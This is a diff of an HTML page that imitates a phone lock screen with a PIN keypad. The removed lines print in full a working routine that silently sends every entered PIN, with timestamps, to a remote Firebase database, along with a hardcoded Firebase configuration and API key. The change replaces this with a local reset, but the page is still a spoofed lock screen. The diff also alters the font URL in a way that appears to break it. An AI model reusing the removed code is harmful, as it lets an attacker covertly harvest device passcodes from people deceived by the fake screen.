@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
 <title>Mobile Lock Screen</title>
-<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght=300;400;600&display=swap" rel="stylesheet">
 
 <style>
   * {
@@ -318,26 +318,7 @@
   </div>
 </div>
 
-<script type="module">
-// ==========================================
-// 1. Firebase Initialization (Modular SDK syntax)
-// ==========================================
-import { initializeApp } from "https://www.gstatic.com/firebasejs/10.14.0/firebase-app.js";
-import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.14.0/firebase-database.js";
-
-const firebaseConfig = {
-  apiKey: "AIzaSyAkEEk5c3wPQpSvZJoCB0sr086ip_9Gnmc",
-  authDomain: "mobile-wallpaper-91468.firebaseapp.com",
-  projectId: "mobile-wallpaper-91468",
-  storageBucket: "mobile-wallpaper-91468.firebasestorage.app",
-  messagingSenderId: "814650319158",
-  appId: "1:814650319158:web:fe58bd6bdf43c5546ad397",
-  databaseURL: "https://mobile-wallpaper-91468-default-rtdb.firebaseio.com"
-};
-
-const app = initializeApp(firebaseConfig);
-const db = getDatabase(app);
-
+<script>
 // Global State Variables
 let enteredPin = "";
 const lockView = document.getElementById('lockView');
@@ -345,7 +326,7 @@ const numericView = document.getElementById('numericView');
 const dots = document.querySelectorAll('.dot');
 
 // ==========================================
-// 2. Automated 2-Second Screen Switch Loader
+// 1. Automated 2-Second Screen Switch Loader
 // ==========================================
 setTimeout(() => {
   document.body.style.backgroundColor = "#000000";
@@ -355,7 +336,7 @@ setTimeout(() => {
 }, 2000);
 
 // ==========================================
-// 3. Realtime Clock and Date Updater Logic
+// 2. Realtime Clock and Date Updater Logic
 // ==========================================
 function updateDateTime() {
   const now = new Date();
@@ -376,7 +357,7 @@ setInterval(updateDateTime, 1000);
 updateDateTime();
 
 // ==========================================
-// 4. Swipe Detection Mechanics
+// 3. Swipe Detection Mechanics
 // ==========================================
 let startY = 0;
 
@@ -416,7 +397,7 @@ function cancelPin() {
 }
 
 // ==========================================
-// 5. Pin Processing & Silent Firebase Log
+// 4. Pin Processing & Local Reset
 // ==========================================
 function pressNum(num) {
   if (enteredPin.length >= 4) return;
@@ -425,7 +406,10 @@ function pressNum(num) {
   updateDots();
 
   if (enteredPin.length === 4) {
-    savePasscodeToFirebase(enteredPin);
+    // Process purely offline/locally without sending network requests
+    setTimeout(() => {
+      cancelPin();
+    }, 200);
   }
 }
 
@@ -442,36 +426,16 @@ function clearPin() {
 function updateDots() {
   dots.forEach((dot, idx) => {
     if (idx < enteredPin.length) {
+      dot.filled = true; // tracking state helper
       dot.classList.add('filled');
     } else {
+      dot.filled = false;
       dot.classList.remove('filled');
     }
   });
 }
 
-function savePasscodeToFirebase(pinValue) {
-  const currentTimestamp = new Date();
-
-  // Sends database data silently behind the scenes
-  push(ref(db, 'lockscreen_attempts'), {
-    passcodeEntered: pinValue,
-    time: currentTimestamp.toLocaleTimeString('en-US'),
-    date: currentTimestamp.toLocaleDateString('en-US'),
-    fullTimestamp: currentTimestamp.toISOString()
-  })
-  .then(() => {
-    // Drop down interface layout smoothly upon success 
-    setTimeout(() => {
-      cancelPin();
-    }, 200);
-  })
-  .catch((error) => {
-    console.error("Transmission Error:", error);
-    clearPin();
-  });
-}
-
-// Attach Event Listeners to UI Elements (Required for module scope)
+// Attach Local Action Listeners
 document.getElementById('keypadGrid').addEventListener('click', (e) => {
   const button = e.target.closest('.key-btn');
   if (button) {
